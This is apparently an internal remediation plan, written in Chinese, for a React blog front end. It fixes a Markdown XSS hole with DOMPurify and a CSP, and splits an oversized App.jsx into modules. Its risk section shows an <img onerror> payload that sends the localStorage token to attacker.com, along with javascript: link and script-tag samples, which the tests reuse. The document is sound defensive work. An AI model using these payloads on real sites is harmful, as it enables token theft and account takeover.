# P0 紧急问题整改文档

## 一、现状确认

基于当前代码检查，两个 P0 问题均已确认存在：

- `src/App.jsx:80-97` 对 `marked` 做了渲染配置，但 `renderMarkdown()` 直接返回 `marked.parse()` 结果，未做任何 HTML 消毒。
- `src/App.jsx:853` 在文章页中直接使用 `dangerouslySetInnerHTML` 渲染 Markdown 转换后的 HTML。
- `src/App.jsx` 当前总计 **1575 行**，单文件同时承担了：
  - 应用入口与页面切换（`src/App.jsx:221-369`）
  - API 请求与上传（`src/App.jsx:374-425`）
  - 数据规整（`src/App.jsx:427-449`）
  - 页面组件与后台组件（`src/App.jsx:451-1560`）
  - fallback/mock 数据（文件前半段）

---

# P0-1：Markdown XSS 风险整改

## 1. 问题详细说明和风险分析

### 问题说明

当前实现链路如下：

1. `src/App.jsx:80-93` 使用 `marked.use(...)` 配置 Markdown 渲染。
2. `src/App.jsx:95-98` 中 `renderMarkdown()` 直接返回 `marked.parse(markdown)`。
3. `src/App.jsx:853` 中将返回结果直接传给 `dangerouslySetInnerHTML`。

这意味着只要文章内容中包含恶意 HTML 或危险协议链接，就有机会被浏览器当作真实 DOM 执行。

### 风险分析

该问题不是"普通前端展示问题"，而是**可直接升级为账户与后台能力被盗用的安全问题**，原因如下：

- 当前 token 存在 `localStorage` 中：`src/App.jsx:20-22`
- 认证头通过 `authHeader()` 注入请求：`src/App.jsx:24-27`
- 一旦 XSS 成功，恶意脚本可直接读取 `flux_token`
- 拿到 token 后，可继续调用后台接口，例如：
  - `/api/admin/posts`
  - `/api/admin/summary`
  - `/api/admin/site`
  - `/api/auth/change-secret`

### 可能攻击方式

- 原生 HTML 注入：
  ```markdown
  <img src=x onerror="fetch('https://attacker.com?token=' + localStorage.getItem('flux_token'))">
  ```
- 危险链接协议：
  ```markdown
  [点我](javascript:alert(document.cookie))
  ```
- 恶意标签注入：
  ```markdown
  <script>alert('xss')</script>
  ```

### 风险等级

- 等级：**P0**
- 影响范围：所有文章阅读页、后台预览链路、未来任何复用该 Markdown 渲染逻辑的页面
- 直接后果：
  - Token 窃取
  - 后台内容被篡改
  - 页面挂马/钓鱼跳转
  - 管理员账号间接失陷

---

## 2. 具体整改方案（代码示例）

整改建议分为两层：

### 方案 A：紧急止血方案

目标：**最小改动、最快上线**

做法：

1. 引入 `dompurify`
2. 在 `marked.parse()` 之后统一做 HTML 消毒
3. 保留 `dangerouslySetInnerHTML`，但只允许注入"已消毒 HTML"

### 示例代码

#### 2.1 安装依赖

```bash
npm install dompurify
```

#### 2.2 提取 Markdown 安全渲染工具

建议新增 `src/lib/markdown.js`：

```js
import { marked } from "marked";
import DOMPurify from "dompurify";

const escapeHtml = (value = "") =>
  String(value).replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  })[char]);

const normalizeCodeLanguage = (lang = "") => {
  const language = String(lang).trim().split(/\s+/)[0].replace(/[^\w-]/g, "");
  return language || "text";
};

const plainTextFromTokens = (tokens = []) =>
  tokens.map((token) => token.text || plainTextFromTokens(token.tokens)).join("");

const slugBase = (value = "") =>
  String(value)
    .trim()
    .toLowerCase()
    .replace(/<[^>]+>/g, "")
    .replace(/[^\p{L}\p{N}\s-]/gu, "")
    .replace(/\s+/g, "-")
    .replace(/-+/g, "-")
    .replace(/^-|-$/g, "") || "section";

let headingSlugCounts = new Map();

const resetHeadingSlugCounts = () => {
  headingSlugCounts = new Map();
};

const nextHeadingId = (text) => {
  const base = slugBase(text);
  const count = headingSlugCounts.get(base) || 0;
  headingSlugCounts.set(base, count + 1);
  return count ? `${base}-${count + 1}` : base;
};

marked.use({
  renderer: {
    code({ text, lang, escaped }) {
      const language = normalizeCodeLanguage(lang);
      const code = escaped ? text : escapeHtml(text);
      return `<pre class="md-code-block" data-lang="${escapeHtml(language.toUpperCase())}"><code class="language-${escapeHtml(language)}">${code}</code></pre>`;
    },
    heading({ tokens, depth }) {
      const text = plainTextFromTokens(tokens);
      const id = nextHeadingId(text);
      return `<h${depth} id="${escapeHtml(id)}">${this.parser.parseInline(tokens)}</h${depth}>`;
    },
  },
});

export function renderMarkdown(markdown = "") {
  resetHeadingSlugCounts();
  const rawHtml = marked.parse(markdown);

  return DOMPurify.sanitize(rawHtml, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ["script", "style", "iframe", "object", "embed"],
    FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover"],
    ALLOW_UNKNOWN_PROTOCOLS: false,
  });
}

export function extractToc(markdown = "") {
  resetHeadingSlugCounts();
  return marked
    .lexer(markdown)
    .filter((token) => token.type === "heading" && token.depth >= 1 && token.depth <= 3)
    .map((token) => {
      const text = plainTextFromTokens(token.tokens) || token.text;
      return {
        id: nextHeadingId(text),
        title: text,
        depth: token.depth,
      };
    });
}
```

#### 2.3 页面使用方式

如果仍未拆分 `App.jsx`，先在当前文件中替换导入和调用逻辑：

```jsx
import { renderMarkdown, extractToc } from "./lib/markdown";

function ArticlePage({ post, author, setPage, setCategoryFilter }) {
  const markdown = post.content || post.excerpt || "";
  const articleHTML = useMemo(() => renderMarkdown(markdown), [markdown]);
  const tocItems = useMemo(() => extractToc(markdown), [markdown]);

  return (
    <div className="article-body" dangerouslySetInnerHTML={{ __html: articleHTML }} />
  );
}
```

### 方案 B：标准安全方案

在方案 A 基础上再补两点：

1. 后端保存文章时也做一次校验/清洗
2. 增加 CSP 防护，降低漏网 XSS 的利用价值

建议的 CSP 方向：

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
```

---

## 3. 改动文件清单

### 最小落地版本

- `package.json`
  - 新增 `dompurify`
- `src/App.jsx`
  - 移除当前文件内不安全的 `renderMarkdown()` 逻辑或改为调用安全渲染工具
- `src/lib/markdown.js`
  - 新增 Markdown 渲染与消毒工具

### 推荐版本

- `package.json`
- `src/lib/markdown.js`
- `src/pages/ArticlePage.jsx`
- `src/__tests__/markdown.test.jsx`
- `src/__tests__/article-page.test.jsx`

---

## 4. 测试验证方法

### 自动化测试

建议新增 `Vitest + Testing Library`，重点覆盖以下用例：

#### 4.1 恶意脚本标签被移除

```js
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../lib/markdown";

describe("renderMarkdown", () => {
  it("should strip script tags", () => {
    const html = renderMarkdown("# title\n<script>alert(1)</script>");
    expect(html).not.toContain("<script");
  });

  it("should strip event handlers", () => {
    const html = renderMarkdown('<img src="x" onerror="alert(1)" />');
    expect(html).not.toContain("onerror");
  });

  it("should block javascript protocol", () => {
    const html = renderMarkdown('[xss](javascript:alert(1))');
    expect(html).not.toContain("javascript:alert");
  });
});
```

### 手工验证

使用后台编辑器录入以下内容并打开文章页：

#### 验证样例 1

```markdown
# 安全测试
<script>alert("xss")</script>
```

预期结果：

- 页面正常显示
- 不弹窗
- DOM 中不存在 `<script>` 标签

#### 验证样例 2

```markdown
<img src="x" onerror="alert('xss')" />
```

预期结果：

- 不执行 `onerror`
- DOM 中不保留危险属性

#### 验证样例 3

```markdown
[恶意链接](javascript:alert('xss'))
```

预期结果：

- 不可执行 `javascript:` 协议
- 链接被清洗或变为无害文本

### 回归验证

- 正常 Markdown 标题、列表、代码块可正常渲染
- TOC 目录仍可生成
- 文章页滚动定位不受影响
- 已有文章内容不出现样式错乱

---

## 5. 注意事项和风险点

- `dangerouslySetInnerHTML` 本身不是原罪，**关键是输入内容必须先消毒**。
- 仅前端消毒还不够，如果未来有 SSR、后台预览、导出 HTML、邮件推送等场景，后端也必须做二次校验。
- 如果业务并不需要 Markdown 中的原生 HTML，建议后续直接禁用原生 HTML，风险更低。
- DOMPurify 配置不能过度收紧，否则可能误伤正常渲染；不能过度放宽，否则起不到安全作用。
- 安全修复应优先于结构重构，建议先止血上线，再做 `App.jsx` 拆分。
- 修复后应安排一次针对文章内容链路的专项安全回归。

---

# P0-2：`App.jsx` 过度膨胀整改

## 1. 问题详细说明和风险分析

### 问题说明

当前 `src/App.jsx` 已达到 **1575 行**，同时混合了以下职责：

- 应用状态管理
- hash 路由切换
- API 请求
- 鉴权 token 读写
- 图片上传
- 数据规整
- 首页/博客页/标签页/文章页/作者页/后台页/编辑页
- 登录弹窗
- 修改密钥表单
- fallback/mock 数据

这是典型的"上帝文件"问题。

### 风险分析

#### 1. 变更风险高

任何一个小改动都可能影响整个文件，导致：

- 页面渲染异常
- 状态串联错误
- 后台能力误伤
- 合并冲突频繁

#### 2. 测试难度高

当前没有清晰模块边界，很难对以下能力单独测试：

- API 层
- 鉴权层
- Markdown 渲染层
- 编辑器页
- 登录弹窗

#### 3. 维护成本高

新需求接入时，开发者往往只能继续往 `App.jsx` 里堆代码，结果是：

- 文件继续膨胀
- 逻辑耦合继续加深
- 技术债进一步扩大

#### 4. 隐性回归风险高

例如：

- 登录弹窗依赖 `refreshData`
- 编辑器保存依赖 `savePost / saveEditorPost`
- 页面切换依赖 `page` 字符串和多个 state

这些都属于典型的"改一个点，崩另一片"。

---

## 2. 具体整改方案（代码示例）

整改原则：

- **先拆职责，不改业务行为**
- **先抽纯函数和服务层，再抽页面**
- **避免在本次 P0 中同时引入新路由库或新状态管理库**

### 推荐目录结构

```txt
src/
  app/
    AppRoutes.jsx
  components/
    auth/
      LoginDialog.jsx
      ChangeSecretForm.jsx
    common/
      Icon.jsx
      SectionHeader.jsx
    navigation/
      TopNav.jsx
      SideNav.jsx
    post/
      PostCard.jsx
      WidePostCard.jsx
      CategoryLabel.jsx
      CardMeta.jsx
  data/
    fallback.js
  hooks/
    useAppController.js
    useHashRoute.js
  lib/
    markdown.js
    post.js
  pages/
    HomePage.jsx
    BlogPage.jsx
    TagsPage.jsx
    ArticlePage.jsx
    AuthorPage.jsx
    AdminPage.jsx
    EditorPage.jsx
    AuthorEditorPage.jsx
    SiteConfigEditorPage.jsx
    MissingPage.jsx
  services/
    api.js
    auth.js
    upload.js
  App.jsx
  main.jsx
```

### 拆分方案

#### 第一步：抽离服务层

将以下逻辑从 `App.jsx` 中迁出：

- `loadJSON`
- `apiJSON`
- `uploadImage`
- `getToken / setToken / clearToken / authHeader`

示例：`src/services/auth.js`

```js
export const getToken = () => localStorage.getItem("flux_token");
export const setToken = (token) => localStorage.setItem("flux_token", token);
export const clearToken = () => localStorage.removeItem("flux_token");

export const authHeader = () => {
  const token = getToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
};
```

示例：`src/services/api.js`

```js
import { authHeader } from "./auth";

export async function loadJSON(path) {
  try {
    const response = await fetch(path);
    if (!response.ok) return null;
    return await response.json();
  } catch {
    return null;
  }
}

export async function apiJSON(path, options = {}) {
  try {
    const response = await fetch(path, {
      method: options.method || "GET",
      headers: {
        "Content-Type": "application/json",
        ...authHeader(),
      },
      body: options.body ? JSON.stringify(options.body) : undefined,
    });

    if (!response.ok) {
      const data = await response.json().catch(() => null);
      return { error: data?.error || `request failed: ${response.status}` };
    }

    return await response.json();
  } catch {
    return { error: "network error" };
  }
}
```

#### 第二步：抽离应用控制器

把当前 `App()` 中的大量 state 和 action 收敛到 `useAppController()`。

示例：`src/hooks/useAppController.js`

```js
import { useEffect, useState } from "react";
import { loadJSON, apiJSON } from "../services/api";
import { normalizePost, normalizeTag, toEditorDraft, newEditorDraft } from "../lib/post";
import { fallbackPosts, fallbackTags, fallbackAuthor, fallbackSiteConfig, fallbackAdminSummary, emptyEditorPost } from "../data/fallback";

export function useAppController() {
  const [query, setQuery] = useState("");
  const [posts, setPosts] = useState(fallbackPosts);
  const [adminPosts, setAdminPosts] = useState(fallbackPosts);
  const [tags, setTags] = useState(fallbackTags);
  const [author, setAuthor] = useState(fallbackAuthor);
  const [siteConfig, setSiteConfig] = useState(fallbackSiteConfig);
  const [adminSummary, setAdminSummary] = useState(fallbackAdminSummary);
  const [apiStatus, setApiStatus] = useState("checking");
  const [editorDraft, setEditorDraft] = useState(emptyEditorPost);
  const [selectedPost, setSelectedPost] = useState(null);
  const [categoryFilter, setCategoryFilter] = useState("");
  const [showLogin, setShowLogin] = useState(false);

  async function refreshData() {
    // 保持现有行为不变，先迁移代码位置
  }

  useEffect(() => {
    refreshData();
  }, []);

  return {
    query, setQuery,
    posts, adminPosts, tags, author, siteConfig, adminSummary,
    apiStatus, editorDraft, setEditorDraft,
    selectedPost, setSelectedPost,
    categoryFilter, setCategoryFilter,
    showLogin, setShowLogin,
    refreshData,
  };
}
```

#### 第三步：抽离路由状态

当前页面切换实际上是 hash 路由，建议抽成 `useHashRoute()`。

示例：`src/hooks/useHashRoute.js`

```js
import { useEffect, useState } from "react";

export function useHashRoute(defaultPage = "home") {
  const [page, setPageState] = useState(() => window.location.hash.slice(1) || defaultPage);

  useEffect(() => {
    const handleHashChange = () => {
      setPageState(window.location.hash.slice(1) || defaultPage);
    };

    window.addEventListener("hashchange", handleHashChange);
    return () => window.removeEventListener("hashchange", handleHashChange);
  }, [defaultPage]);

  const setPage = (nextPage) => {
    window.location.hash = nextPage;
  };

  return { page, setPage };
}
```

#### 第四步：让 `App.jsx` 只保留壳层职责

目标：`App.jsx` 只负责布局、装配和页面分发。

示例：`src/App.jsx`

```jsx
import { useHashRoute } from "./hooks/useHashRoute";
import { useAppController } from "./hooks/useAppController";
import { TopNav } from "./components/navigation/TopNav";
import { SideNav } from "./components/navigation/SideNav";
import { AppRoutes } from "./app/AppRoutes";
import { LoginDialog } from "./components/auth/LoginDialog";

export default function App() {
  const { page, setPage } = useHashRoute("home");
  const app = useAppController();

  return (
    <>
      <TopNav
        page={page}
        setPage={setPage}
        query={app.query}
        setQuery={app.setQuery}
        apiStatus={app.apiStatus}
        setCategoryFilter={app.setCategoryFilter}
      />
      <SideNav
        page={page}
        setPage={setPage}
        setCategoryFilter={app.setCategoryFilter}
        goAdmin={() => app.setShowLogin(true)}
      />
      <main className={`app-shell ${page === "article" ? "article-shell" : ""}`}>
        <AppRoutes page={page} setPage={setPage} app={app} />
      </main>
      {app.showLogin && (
        <LoginDialog onClose={() => app.setShowLogin(false)} />
      )}
    </>
  );
}
```

#### 第五步：迁移 fallback/mock 数据

当前文件中的 fallback/mock 数据统一迁入 `src/data/fallback.js`：

```js
export const fallbackPosts = [/* ... */];
export const fallbackTags = [/* ... */];
export const fallbackAuthor = { /* ... */ };
export const fallbackSiteConfig = { /* ... */ };
export const fallbackAdminSummary = { /* ... */ };
export const emptyEditorPost = { /* ... */ };
export const categoryOptions = ["随笔", "前端", "工程", "阅读", "项目", "标签"];
```

---

## 3. 改动文件清单

### 必改文件

- `src/App.jsx`
  - 精简为应用壳层
- `src/data/fallback.js`
  - 迁移 fallback/mock 数据
- `src/services/api.js`
  - 迁移请求逻辑
- `src/services/auth.js`
  - 迁移 token 与鉴权逻辑
- `src/services/upload.js`
  - 迁移上传逻辑
- `src/hooks/useHashRoute.js`
  - 抽离页面切换逻辑
- `src/hooks/useAppController.js`
  - 抽离全局状态与动作
- `src/lib/post.js`
  - 迁移 `normalizePost / normalizeTag / toEditorDraft / newEditorDraft / estimateReadTime`
- `src/lib/markdown.js`
  - 迁移 Markdown 逻辑
- `src/app/AppRoutes.jsx`
  - 集中页面分发

### 页面拆分文件

- `src/pages/HomePage.jsx`
- `src/pages/BlogPage.jsx`
- `src/pages/TagsPage.jsx`
- `src/pages/ArticlePage.jsx`
- `src/pages/AuthorPage.jsx`
- `src/pages/AdminPage.jsx`
- `src/pages/EditorPage.jsx`
- `src/pages/AuthorEditorPage.jsx`
- `src/pages/SiteConfigEditorPage.jsx`
- `src/pages/MissingPage.jsx`

### 组件拆分文件

- `src/components/common/Icon.jsx`
- `src/components/common/SectionHeader.jsx`
- `src/components/navigation/TopNav.jsx`
- `src/components/navigation/SideNav.jsx`
- `src/components/post/PostCard.jsx`
- `src/components/post/WidePostCard.jsx`
- `src/components/post/CategoryLabel.jsx`
- `src/components/post/CardMeta.jsx`
- `src/components/auth/LoginDialog.jsx`
- `src/components/auth/ChangeSecretForm.jsx`

### 测试文件

- `src/__tests__/app.smoke.test.jsx`
- `src/__tests__/routes.test.jsx`
- `src/__tests__/editor.test.jsx`

---

## 4. 测试验证方法

### 自动化测试建议

#### 4.1 App 壳层冒烟测试

- 首页可正常渲染
- 默认路由为 `home`
- 切换 `#blog`、`#article`、`#admin` 时页面正确切换

#### 4.2 服务层测试

- `apiJSON()` 在 2xx / 4xx / 网络异常时返回值符合预期
- `authHeader()` 在 token 存在/不存在时返回正确结果
- `uploadImage()` 对上传失败、413、大图场景处理正确

#### 4.3 页面级回归测试

- 文章列表点击进入文章页
- 后台点击"新建文章""编辑文章""发布/撤回""删除"流程正常
- 登录弹窗可打开、关闭、提交
- 作者页、首页配置页保存逻辑正常

### 手工验证清单

按以下路径逐项回归：

1. 首页打开正常
2. 博客列表筛选正常
3. 标签页跳转正常
4. 文章页目录正常
5. 后台登录成功/失败提示正常
6. 新建文章、保存草稿、发布文章正常
7. 编辑作者信息正常
8. 编辑首页配置正常
9. 图片上传成功/失败提示正常
10. 浏览器前进/后退时 hash 页面状态正常

### 验证标准

- `src/App.jsx` 控制在 **200 行以内**
- 单个页面文件建议控制在 **300 行以内**
- 公共逻辑全部从页面文件中移出
- 构建通过：`npm run build`
- 自动化测试通过：`npm run test`

---

## 5. 注意事项和风险点

- 本次整改应采用"**重构不改行为**"策略，避免边拆边改需求。
- 不建议在同一批次同时做：
  - 路由库替换
  - 状态管理库替换
  - 样式体系重构
  - UI 改版
- 页面拆分时必须保持现有 props 协议不变，否则容易产生隐式回归。
- 抽离公共组件时，CSS class 名尽量保持不变，避免样式回归。
- 拆分过程中要警惕循环依赖，尤其是：
  - `pages` 反向依赖 `App`
  - `components` 依赖 `pages`
- `useHashRoute()` 建议补上 `hashchange` 监听，否则浏览器前进/后退可能与页面状态不一致。
- fallback/mock 数据应彻底迁出 `App.jsx`，避免继续加重文件职责。
- 可顺手清理未使用组件和死代码，但不要影响本次整改主线。

---

# 建议实施顺序

1. **先完成 P0-1：Markdown XSS 止血修复并上线**
2. **再执行 P0-2：`App.jsx` 结构化拆分**
3. 拆分完成后补自动化测试
4. 最后安排一次安全回归 + 功能回归
